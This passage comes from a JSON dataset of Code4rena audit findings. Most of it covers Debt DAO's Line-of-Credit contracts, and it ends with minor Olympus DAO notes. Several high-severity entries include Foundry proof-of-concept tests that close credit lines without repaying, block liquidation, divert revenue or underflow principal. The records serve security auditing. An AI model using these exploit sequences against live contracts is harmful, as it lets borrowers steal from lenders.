principalPayment = amount - interest;\n\n        // update individual credit line denominated in token\n        credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block\n        credit.interestRepaid += interest;\n        credit.interestAccrued = 0;\n\n        emit RepayInterest(id, interest);\n        emit RepayPrincipal(id, principalPayment);\n\n        return credit;\n    }\n} }\n```\n\nTo demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test \"test_lender_use_and_repay_underflow\"`.\n\nFollowing scenario causes the repayment to underflow:\n\n1.  Borrower borrows `1 ether` of `revenueToken`\n2.  `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract\n3.  Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`)\n4.  `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`\n\n```solidity\nfunction test_lender_use_and_repay_underflow() public {\n    uint256 largeRevenueAmount = lentAmount * 2;\n\n    deal(address(lender), lentAmount + 1 ether);\n    deal(address(revenueToken), MAX_REVENUE);\n    address revenueC = address(0xbeef); // need new spigot for testing\n    bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);\n\n    // 1. Borrow lentAmount = 1 ether\n    _borrow(id, lentAmount);\n\n    // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)\n    bytes memory tradeData = abi.encodeWithSignature(\n      'trade(address,address,uint256,uint256)',\n      address(revenueToken),\n      Denominations.ETH,\n      1 gwei,\n      largeRevenueAmount\n    );\n\n    hoax(borrower);\n    line.claimAndTrade(address(revenueToken), tradeData);\n\n    (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));\n    assertEq(principalBeforeRepaying, lentAmount);\n\n    // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)\n    vm.prank(lender);\n    line.useAndRepay(largeRevenueAmount);\n    (, uint256 _principal,,,,,) = line.credits(line.ids(0));\n\n    uint256 underflowedPrincipal = principalBeforeRepaying;\n\n    unchecked {\n      underflowedPrincipal -= (largeRevenueAmount);\n    }\n\n    // 4. Principal underflowed\n    assertEq(_principal, underflowedPrincipal);\n  }\n```\n\n### Recommended Mitigation Steps\n\nConsider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326)\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/461)**\n\n\n***\n\n \n",
      "summary": "\nThis bug report describes an issue with the `SpigotedLine.useAndRepay` function in the CreditLib.sol contract. This function allows a borrower or lender to repay (parts) of a credit line. However, if the amount exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number. This will force a secured line immediately into liquidation and make it expensive to repay the credit line.\n\nThe recommended mitigation step is to assert that the amount is less or equal than `credit.principal + credit.interestAccrued`. This is similar to how it is done in the LineOfCredit.depositAndRepay() function.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/461",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "Trust",
        "rvierdiiev",
        "berndartmueller",
        "hansfriese",
        "0xdeadbeef0x",
        "adriro",
        "aphak5010"
      ]
    },
    {
      "id": "6239",
      "title": "[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. ",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538\n\n\n## Vulnerability details\n\n## Description\n\nLineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0\\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0\\] before other credit lines. \n\nThe list is managed by several functions:\n\n1.  CreditListLib.removePosition - deletes parameter id in the ids array\n2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element\n3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:\n    1.  target index is not empty\n    2.  there is no principal owed for the target index's credit\n\nThe idea I had is that if we could corrupt the ids array so that ids\\[0\\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. \n\n```\nmodifier whileBorrowing() {\n    if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n    _;\n}\n```\n\nIt turns out there is a simple sequence of calls which allows borrowing while ids\\[0\\] is deleted, and does not re-arrange the new borrow into ids\\[0\\]!\n\n1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array.\n2.  id2 = addCredit() - called again, ids.length = 2\n3.  close(id1) - calls removePosition() on id1, now ids array is \\[0x000000000000000000000000, id2 \\]\n4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).\n\nFrom this sequence, we achieve a borrow while ids\\[0\\] is 0! Therefore, credits\\[ids\\[0\\]\\].principal = credits\\[0\\].principal = 0, and whileBorrowing() reverts.\n\nThe impact is massive - the following functions are disabled:\n\n- SecureLine::liquidate()\n- LineOfCredit::depositAndClose()\n- LineOfCredit::depositAndRepay()\n- LineOfCredit::claimAndRepay()\n- LineOfCredit::claimAndTrade()\n\n## Impact\n\nBorrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.\n\n## Proof of Concept\n\nCopy the following code into LineOfCredit.t.sol\n\n```\nfunction _addCreditLender2(address token, uint256 amount) public {\n    // Prepare lender 2 operations, does same as mintAndApprove()\n    address lender2 = address(21);\n    deal(lender2, mintAmount);\n    supportedToken1.mint(lender2, mintAmount);\n    supportedToken2.mint(lender2, mintAmount);\n    unsupportedToken.mint(lender2, mintAmount);\n    vm.startPrank(lender2);\n    supportedToken1.approve(address(line), MAX_INT);\n    supportedToken2.approve(address(line), MAX_INT);\n    unsupportedToken.approve(address(line), MAX_INT);\n    vm.stopPrank();\n    // addCredit logic\n    vm.prank(borrower);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n    vm.prank(lender2);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n}\nfunction test_attackUnliquidatable() public {\n    bytes32 id_1;\n    bytes32 id_2;\n    _addCredit(address(supportedToken1), 1 ether);\n    _addCreditLender2(address(supportedToken1), 1 ether);\n    id_1 =  line.ids(0);\n    id_2 =  line.ids(1);\n    hoax(borrower);\n    line.close(id_1);\n    hoax(borrower);\n    line.borrow(id_2, 1 ether);\n    id_1 =  line.ids(0);\n    id_2 = line.ids(1);\n    console.log(\"id1 : \", uint256(id_1));\n    console.log(\"id2 : \", uint256(id_2));\n    vm.warp(ttl+1);\n    assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);\n    vm.expectRevert(ILineOfCredit.NotBorrowing.selector);\n    bool isSolvent = line.declareInsolvent();\n}\n```\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nWhen sorting new borrows into the ids queue, do not skip any elements.",
      "summary": "\nThis bug report is about a vulnerability found in the LineOfCredit contract which manages an array of open credit line identifiers called `ids`. The vulnerability is that if the `ids` array is corrupted in a specific way, a borrow can be made while `ids[0]` is zero. This would disable several functions such as `SecureLine::liquidate()` and `LineOfCredit::depositAndClose()`.\n\nThe vulnerability was discovered by a manual audit. The proof of concept involves a sequence of calls where a new credit line is added, the first credit line is closed, and then the second credit line is borrowed from. The sorting loop will not find another index other than the second credit line's existing index, which allows the borrow to go through.\n\nThe recommended mitigation step for this vulnerability is to not skip any elements when sorting new borrows into the `ids` queue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/421",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust",
        "bin2chen"
      ]
    },
    {
      "id": "6238",
      "title": "[H-04] Borrower can close a credit without repaying debt",
      "impact": "HIGH",
      "content": "\nA borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.\n\n### Proof of Concept\n\nThe `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID:\n[LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388):\n\n```solidity\nfunction close(bytes32 id) external payable override returns (bool) {\n    Credit memory credit = credits[id];\n    address b = borrower; // gas savings\n    if(msg.sender != credit.lender && msg.sender != b) {\n      revert CallerAccessDenied();\n    }\n\n    // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off\n    credit = _accrue(credit, id);\n    uint256 facilityFee = credit.interestAccrued;\n    if(facilityFee > 0) {\n      // only allow repaying interest since they are skipping repayment queue.\n      // If principal still owed, _close() MUST fail\n      LineLib.receiveTokenOrETH(credit.token, b, facilityFee);\n\n      credit = _repay(credit, id, facilityFee);\n    }\n\n    _close(credit, id); // deleted; no need to save to storage\n\n    return true;\n}\n```\n\n[LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483):\n\n```solidity\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n    // return the Lender's funds that are being repaid\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH(\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n\n    delete credits[id]; // gas refunds\n\n    // remove from active list\n    ids.removePosition(id);\n    unchecked { --count; }\n\n    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n    emit CloseCreditPosition(id);\n\n    return true;\n}\n```\n\nProof of Concept:\n\n```solidity\n// contracts/tests/LineOfCredit.t.sol\nfunction testCloseWithoutRepaying_AUDIT() public {\n    assertEq(supportedToken1.balanceOf(address(line)), 0, \"Line balance should be 0\");\n    assertEq(supportedToken1.balanceOf(lender), mintAmount, \"Lender should have initial mint balance\");\n      \n    _addCredit(address(supportedToken1), 1 ether);\n\n    bytes32 id = line.ids(0);\n    assert(id != bytes32(0));\n\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, \"Lender should have initial balance less lent amount\");\n    \n    hoax(borrower);\n    line.borrow(id, 1 ether);\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, \"Borrower should have initial balance + loan\");\n    \n    // The credit hasn't been repaid.\n    // hoax(borrower);\n    // line.depositAndRepay(1 ether);\n    \n    hoax(borrower);\n    // Closing with a non-existent credit ID.\n    line.close(bytes32(uint256(31337)));\n\n    // The debt hasn't been repaid but the status is REPAID.\n    assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));\n\n    // Lender's balance is still reduced by the borrow amount.\n    assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);\n\n    // Borrower's balance still includes the borrowed amount.\n    assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nIn the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/258)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LineOfCredit contract of the DebtDAO project. The vulnerability allows a borrower to close a credit without repaying the debt to the lender, leaving the lender with a bad debt and the borrower with the borrowed amount and the collateral. This is possible because the `close` function of `LineOfCredit` does not check whether a credit exists or not. A Proof of Concept has been provided to demonstrate the vulnerability. The recommended mitigation step is to ensure that a credit with the user-supplied ID exists before closing it in the `close` function of `LineOfCredit`. This bug was found through manual review.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/258",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "joestakey",
        "berndartmueller",
        "smiling_heretic",
        "hansfriese",
        "adriro"
      ]
    },
    {
      "id": "6237",
      "title": "[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH",
      "impact": "HIGH",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234>\n\n<https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270>\n\n### Impact\n\nThe functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:\n\n```solidity\nmodifier mutualConsent(address _signerOne, address _signerTwo) {\n      if(_mutualConsent(_signerOne, _signerTwo))  {\n        // Run whatever code needed 2/2 consent\n        _;\n      }\n}\n\nfunction _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {\n        if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }\n\n        address nonCaller = _getNonCaller(_signerOne, _signerTwo);\n\n        // The consent hash is defined by the hash of the transaction call data and sender of msg,\n        // which uniquely identifies the function, arguments, and sender.\n        bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));\n\n        if (!mutualConsents[expectedHash]) {\n            bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));\n\n            mutualConsents[newHash] = true;\n\n            emit MutualConsentRegistered(newHash);\n\n            return false;\n        }\n\n        delete mutualConsents[expectedHash];\n\n        return true;\n}\n```\n\nThe problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.\n\nThis is very problematic in combination with sending ETH for two reasons:\n1. When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.\n2. Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.\n\n### Proof Of Concept\n\nLender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.\n\n### Recommended Mitigation Steps\n\nConsider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.\n\n**[dmvt (judge) increased severity to High](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/125)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the LineOfCredit smart contract, which is part of the DebitDAO project. The vulnerability is related to the `addCredit` and `increaseCredit` functions, which have a `mutualConsent` or `mutualConsentById` modifier, and are `payable`. The issue is that when one party calls the function and sends ETH, but the other party has not yet given their consent, the function will not revert, but instead set the consent for the calling party, resulting in the ETH being lost. \n\nThe bug can be demonstrated by an example of lender Alice and borrower Bob. Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH, sending 1 ETH with the call. However, because Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it. \n\nThe bug report recommends two mitigation steps: consider implementing an external function to grant consent to avoid this scenario, and consider reverting when ETH is sent along, but the other party has not given their consent yet.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/125",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Trust",
        "minhquanym",
        "berndartmueller",
        "Lambda",
        "HE1M",
        "adriro"
      ]
    },
    {
      "id": "6236",
      "title": "[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury",
      "impact": "HIGH",
      "content": "\nNeither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`:\n\n```solidity\n       if(self.settings[revenueContract].claimFunction == bytes4(0)) {\n            // push payments\n\n            // claimed = total balance - already accounted for balance\n            claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens\n            // underflow revert ensures we have more tokens than we started with and actually claimed revenue\n        }\n```\n\n`SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts:\n\n```solidity\nuint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n```\n\nTherefore, the whole `claimed` amount is sent to the treasury.\n\nThis becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.\n\n### Proof Of Concept\n\nAs mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff:\n\n```diff\n--- a/contracts/tests/Spigot.t.sol\n+++ b/contracts/tests/Spigot.t.sol\n@@ -174,7 +174,7 @@ contract SpigotTest is Test {\n         assertEq(token.balanceOf(address(spigot)), totalRevenue);\n         \n         bytes memory claimData;\n-        spigot.claimRevenue(revenueContract, address(token), claimData);\n+        spigot.claimRevenue(address(0), address(token), claimData);\n```\n\nThanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.\n\n### Recommended Mitigation Steps\n\nCheck that a revenue contract was registered before, revert if it does not.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/119)** \n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the SpigotLib smart contract. The vulnerability is that neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` checks that the provided `revenueContract` was registered before. As a result, all of the tokens are sent to the treasury and none are sent to the escrow, which is problematic for revenue tokens that use push payments. This can be exploited by a malicious actor to ensure that no revenue is available for the lender. \n\nThe recommended mitigation step is to check that a revenue contract was registered before, and revert if it does not. This would prevent the malicious actor from exploiting the vulnerability and ensure that the revenue is sent to the appropriate party.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/119",
      "tags": [
        "Validation",
        "Business Logic"
      ],
      "finders": [
        "adriro",
        "berndartmueller",
        "Lambda",
        "aphak5010"
      ]
    },
    {
      "id": "6235",
      "title": "[H-01] Call to declareInsolvent() would revert when contract status reaches liquidation point after repayment of credit position 1",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86\n\n\n## Vulnerability details\n\n## Impact\nThe modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids]. \n\nAssume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.\n\n\n\n## Proof of Concept\n1. LineOfCredit contract is set up and 5 lenders have deposited into the contract.\n2. Alice, the borrower borrows credit from these 5 credit positions including by calling LineOfCredit.borrow() for the position ids.\n3. Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated\n4. At the point where ids.stepQ() is called in _repay(), position 1 is moved to ids[0]\n4. When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nThe modifier whileBorrowing() would need to be reviewed and amended.",
      "summary": "\nThis bug report concerns the LineOfCredit contract, which is used to manage a line of credit for a borrower. The bug occurs when the borrower pays back the loan for a credit position, and the contract status is set to LIQUIDATABLE. In this case, the call to declareInsolvent() by the arbiter would revert, as the whileBorrowing() modifier check does not pass. This is because the ids array index shift in the call to  stepQ() shifts ids[1] to ids[0], thus making the condition for `credits[ids[0]].principal == 0` be true, causing the revert.\n\nTo reproduce the bug, the LineOfCredit contract must be set up and 5 lenders must have deposited into the contract. The borrower (Alice) then borrows credit from these 5 credit positions, including by calling LineOfCredit.borrow() for the position ids. Later, Alice pays back the loan for  credit position id 1 just before the contract gets liquidated. When the contract status is set to LIQUIDATABLE, no loan is drawn on credit position 0 and the arbiter calls declareInsolvent(), causing the call to revert.\n\nThe recommended mitigation step for this bug is to review and amend the modifier whileBorrowing().",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/69",
      "tags": [
        "Liquidation",
        "Business Logic"
      ],
      "finders": [
        "PaludoX0",
        "cryptphi",
        "ayeslick",
        "Ch_301",
        "adriro",
        "perseverancesuccess"
      ]
    },
    {
      "id": "24196",
      "title": "[N-04] PRICE: stale price",
      "impact": "LOW",
      "content": "\nThere is no indicator whether the price information is up-to-date. If the price information is not properly updated, the other contracts will keep using the data resulting in incorrect prices for swap.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24195",
      "title": "[N-03] RANGE, PRICE: unused import of `FullMath`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L18>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L23>\n\nThe modules `RANGE` and `PRICE` imports `FullMath`, but it is not used.\n\n```solidity\n// modules/PRICE.sol\n 22 contract OlympusPrice is Module {\n 23     using FullMath for uint256;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24194",
      "title": "[N-02] INSTR, Governance: upon module's upgrade, all instruction data should be carried over to the new modules",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L187>\n\nThe `Governance`'s logic will break if the `INSTR` module is upgraded to a new contract without having the same instructions data,  since the `proposalId`'s the `Governance` is using are bound to the `INSTR` module.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24193",
      "title": "[N-01] Kernel: missing zero address check for `executor` and `admin`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L250-L253>\n\nThe `executor` and `admin` are not checked for the zero address when set by the `Kernel::executeAction`.\n\n```solidity\n// Kernel::executeAction\n250         } else if (action_ == Actions.ChangeExecutor) {\n251             executor = target_;\n252         } else if (action_ == Actions.ChangeAdmin) {\n253             admin = target_;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5578",
      "title": "[G-14] `revert` operator should be in the code as early as reasonably possible (3 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **200**<br>\nMethod Call Gas Saved: **1 559+**<br>\n\n*   src/modules/INSTR.sol:[43-48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48)\n\n```solidity\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n47\n48        if (length == 0) revert INSTR_InstructionsCannotBeEmpty(); // @note after 43\n```\n\n*   src/policies/Governance.sol:[180-191](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191), [241-249](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249)\n\n```solidity\n180    function endorseProposal(uint256 proposalId_) external {\n181        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n182\n183        if (proposalId_ == 0) {\n184            revert CannotEndorseNullProposal();\n185        }\n186\n187        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n188        if (instructions.length == 0) {\n189            revert CannotEndorseInvalidProposal();\n190        }\n191\n```\n\n```solidity\n241        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert\n242\n243        if (activeProposal.proposalId == 0) {\n244            revert NoActiveProposalDetected();\n245        }\n246\n247        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n248            revert UserAlreadyVoted();\n249        }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-14-revert-operator-should-be-in-the-code-as-early-as-reasonably-possible-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5577",
      "title": "[G-11] `x = x + y` is cheaper than `x += y;` (6 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **5 000**\n\nUsually does not work with struct and mappings.\n\n*   src/modules/PRICE.sol:[136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136), [138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138), [222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222)\n\n```solidity\n136            _movingAverage += (currentPrice - earliestPrice) / numObs;\n...\n138            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n...\n222            total += startObservations_[i];\n```\n\n*   src/modules/VOTES.sol:[56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56), [58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58)\n\n```solidity\n56        balanceOf[from_] -= amount_;\n...\n58            balanceOf[to_] += amount_;\n```\n\n*   src/policies/Heart.sol:[103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)\n\n```solidity\n103        lastBeat += frequency();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-11-x--x--y-is-cheaper-than-x--y-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5576",
